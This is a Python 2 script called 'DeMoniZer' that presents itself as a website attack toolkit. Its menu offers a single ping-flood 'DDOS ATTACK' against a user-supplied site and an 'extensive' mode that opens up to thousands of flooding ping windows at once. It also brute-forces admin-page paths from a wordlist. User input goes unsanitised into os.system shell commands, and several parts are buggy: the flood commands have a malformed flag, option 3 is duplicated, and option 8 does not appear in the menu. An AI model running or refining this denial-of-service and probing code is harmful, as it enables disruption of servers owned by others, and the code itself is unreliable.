import os
import urllib2
import requests
import sys
from urllib2 import Request, urlopen, URLError, HTTPError
from bs4 import BeautifulSoup
os.system('color e')
logo='''   
          (             )           )       *       )   
          )\ )       ( /(  (     ( /(     (  `   ( /(   
         (()/(  (    )\()) )\    )\())(   )\))(  )\())  
          /(_)) )\  ((_)((((_)( ((_)\ )\ ((_)()\((_)\   
         (_))_ ((_)__ ((_)\ _ )\ _((_|(_)(_()((_) ((_)  
         |   \| __\ \ / (_)_\(_) \| | __|  \/  |/ _ \  
         | |) | _| \ V / / _ \ | .` | _|| |\/| | (_) | 
         |___/|___| |_| /_/ \_\|_|\_|___|_|  |_|\___/  
                                               
      [~/         WeLcOmE To DeMoniZer Ver 1.0        \~]
      [~/  [C]    Author : DEYANEMO                   \~]
      [~/  [E]    deyanemo@gmail.com                  \~]
      [~/  [i]    Al-Salam Alekum wa rahmatu Allah    \~]
      [~/  [i]    Freedom TO SyRiA *** Greetz to All  \~]
''' 
print logo
if len(sys.argv) > 2 or len(sys.argv) < 2:
   print ('$usage : python deya.py ')
   userin  = raw_input('Website Url must be like (example.com) : ')
elif len(sys.argv) > 1:
   userin = sys.argv[1]
elif len(sys.argv) > 1 or len(sys.argv) < 1:
   userin  = raw_input('Website Url must be like (example.com) : ')
else:
   print('Usage : $ deya.py deyanemo.com OR  deya.py')

# Functions 0_0 
def ipaddress(ur):
   print('######################################')
   print('Server Ip Address !')
   print('######################################')
   res = os.system('ping -t -a -l -f -n 1 ' + ur)
   print('######################################')

   return res
def nslookup(ur):
   print('######################################')
   print('NSLOOKUP !')
   print('######################################')
   res = os.system('nslookup -type=mx ' + userin)
   print('######################################')
   return res
def tracert(ur):
   print('######################################')
   print(' TRACERT  !')
   print('######################################')
   res =  os.system('tracert ' + userin)
   print('######################################')
   return res
def ddos(ur):
   print('######################################')
   print(' DDOS ATTACK  !')
   print('######################################')
   res = os.system('ping -t -a -l -f ' + userin)
   print('######################################')
   return res
def exddos(ur):
   print('######################################')
   print(' extensive DDOS ATTACK  !')
   print('######################################')
   print('Note : this method will open the amount you give as terminal windows! ')
   var = input('How manny attack you would like to Launch ? integer ex(1, 2000, 10000) :')
   for i in range(1 , var):
      os.system('start ping -t -a -l -f ' + userin)
   print('######################################')
def findadmin(url):
   # f = open('myfile.txt')
   # s = f.readline()
   # # i = int(s.strip())
   # for line in f:
   #    check =  usrinpt + "/" +  line
   #    r = requests.get(check)
   #    #s = urllib2.urlopen(check).read()
   #    if r.status_code == 200 :
   #       os.system('color e ')
   #       print ('[!] Found this', line)
   #    else:
   #       print(r.status_code)
   #    #   print(s)
   f = open('myfile.txt')
   s = f.readline()
   # i = int(s.strip())
   for line in f:
      check =  usrinpt + "/" +  line
      response = requests.get(check)
      if (response.status_code == 200):
         print "d0ne", check
      elif (response.status_code == 404):
         print "NopE 404"
def options():
   print('[0] Exit the script')
   print('[1] for ip address')
   print('[2] for nslookup')
   print('[3] for tracert ')
   print('[4] Find admin ')
   print('[5] one DDOS ATTACK ')
   print('[6] extensive DDOS ATTACK')
   print('[7] Web scrapping [crawler] ')
   useee = input('choose the following : ')
   x = isinstance( useee, int)
   if x == True:
      if useee == 0 :
         exit
      if useee == 1 :
         ipaddress(userin)
         options()
      elif useee ==2 :
         nslookup(userin)
         options()
      elif useee ==3 :
         tracert(userin)
         options()
      elif useee ==3 :
         tracert(userin)
         options()
      elif useee ==4 :
         findadmin(userin)
         options() 
      elif useee ==5 :
         ddos(userin)
         options()
      elif useee ==6 :
         exddos(userin)
         options()
      elif useee ==7:
         webScrapping(userin)
         options()
      elif useee ==8:
         findproblem(userin)
         options()
      else: 
         print('Nope try again ')
   elif x == False:
      print('Please Enter an integer')
def findproblem(ur):
   print('#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\#')
   print('Scanning website ', ur)
   print('//////////////////////////////////////')
   nemo = "https://mxtoolbox.com/domain/" + ur
   page = requests.get(nemo)
   soup = BeautifulSoup(page.content, 'html.parser')
   print('######################################')
   print("Result at : " + nemo)
   print('######################################')
def webScrapping(ur):
   print('#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\#')
   print('Scanning website ', ur)
   print('//////////////////////////////////////')
   nemo = "http://" + ur
   page = requests.get(nemo)
   soup = BeautifulSoup(page.content, 'html.parser')
   result = soup.find_all('a')
   for link in soup.findAll('a'):
      href = link.get('href')
      print('######################################')
      print('[!] : ' + href)
# ##################################################
#       THE CORE  OF CONTENT  :() -_- (o_o) Not Really
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
if userin.find('.') > 0:
   usrinpt = "http://" + userin
   print('Working on : ' + usrinpt )
   options()